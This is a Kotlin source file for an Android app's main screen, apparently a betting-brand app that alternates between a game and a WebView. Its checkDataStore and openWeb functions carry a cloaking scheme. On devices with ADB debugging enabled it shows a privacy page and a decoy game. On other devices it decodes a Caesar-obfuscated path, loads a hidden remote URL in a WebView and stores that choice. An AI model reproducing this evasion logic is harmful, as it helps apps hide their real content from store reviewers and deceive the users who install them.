package com.bettilt.mobile.pt

import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Bundle
import android.view.View
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.constraintlayout.widget.ConstraintSet
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.bettilt.mobile.pt.databinding.ActivityMainBinding
import com.bettilt.mobile.pt.util.DataStoreManager
import com.bettilt.mobile.pt.util.Lottie
import com.bettilt.mobile.pt.util.Once
import com.bettilt.mobile.pt.util.crypto.CryptoUtil
import com.bettilt.mobile.pt.util.internetConnection
import com.bettilt.mobile.pt.util.isEnabledADB
import com.bettilt.mobile.pt.util.log
import com.bettilt.mobile.pt.util.setVisible
import com.bettilt.mobile.pt.util.webView.WebViewFragment
import com.bettilt.mobile.pt.util.webView.isCheckTelegaph
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val WEB_VIEW_ID = 3
        const val PRIVACY     = "https://glifyflov.com/"

        val startIdFlow = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
        var webURL              = "https://www.google.com/"
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding      : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie          : Lottie

    private val webViewFragment = WebViewFragment(this)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()
        asyncCheckInternetConnection()
        lottie.showLoader()

        coroutine.launch(Dispatchers.IO) {

            //startIdFlow.tryEmit(R.id.libGDXFragment)
            checkDataStore()

            launch(Dispatchers.Main) {
                startIdFlow.collect { fragmentId ->
                    when (fragmentId) {
                        R.id.libGDXFragment -> {
                            binding.root.also { rootCL ->
                                ConstraintSet().apply {
                                    clone(rootCL)
                                    constrainPercentWidth(binding.loader.id, .25f)
                                    constrainPercentWidth(binding.internet.id, .25f)
                                }.applyTo(rootCL)
                            }

                            webViewFragment.goneWebView()
                            setNavigationBarColor(R.color.black)
                            setStartDestination(fragmentId)
                            ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE
                        }
                        WEB_VIEW_ID -> {
                            webViewFragment.showAndOpenUrl()
                            setNavigationBarColor(R.color.white)
                            ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }
                        else -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    }.also { requestedOrientation = it }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        webViewFragment.onResume()
    }

    override fun onPause() {
        webViewFragment.onPause()
        super.onPause()
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        webViewFragment.onActivityResult(requestCode, resultCode, data)
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)

        webViewFragment.onCreate(coroutine, binding.webStage)

    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
                delay(3_000)
            }
        }
    }

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "WEB" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = WEB | link = $it")
                        webURL = it
                        startIdFlow.emit(WEB_VIEW_ID)
                    }
                }
                "GAME" -> {
                    log("DataStoreManager Key = GAME")
                    startIdFlow.emit(R.id.libGDXFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    if(isEnabledADB()) openPrivacy() else openWeb()
                }
            }
        }
    }

    private fun openPrivacy() {
        webURL = PRIVACY
        startIdFlow.tryEmit(WEB_VIEW_ID)

        val btnAccept = binding.btnAccept
        btnAccept.setVisible(View.VISIBLE)

        btnAccept.setOnClickListener {
            it.setVisible(View.GONE)

            startIdFlow.tryEmit(R.id.libGDXFragment)
            lottie.showLoader()

            coroutine.launch(Dispatchers.IO) {
                DataStoreManager.Key.update { "GAME" }
            }
        }
    }

    private suspend fun openWeb() {
        val originalString = "nafAeqOQ.sks"
        val decryptionKey  = 3

        val decryptedString = CryptoUtil.caesarDecrypt(originalString, decryptionKey)

        isCheckTelegaph = true

        webURL = PRIVACY + decryptedString
        startIdFlow.tryEmit(WEB_VIEW_ID)

        log(webURL)

        DataStoreManager.Key.update { "WEB" }
        DataStoreManager.Link.update { webURL }
    }

}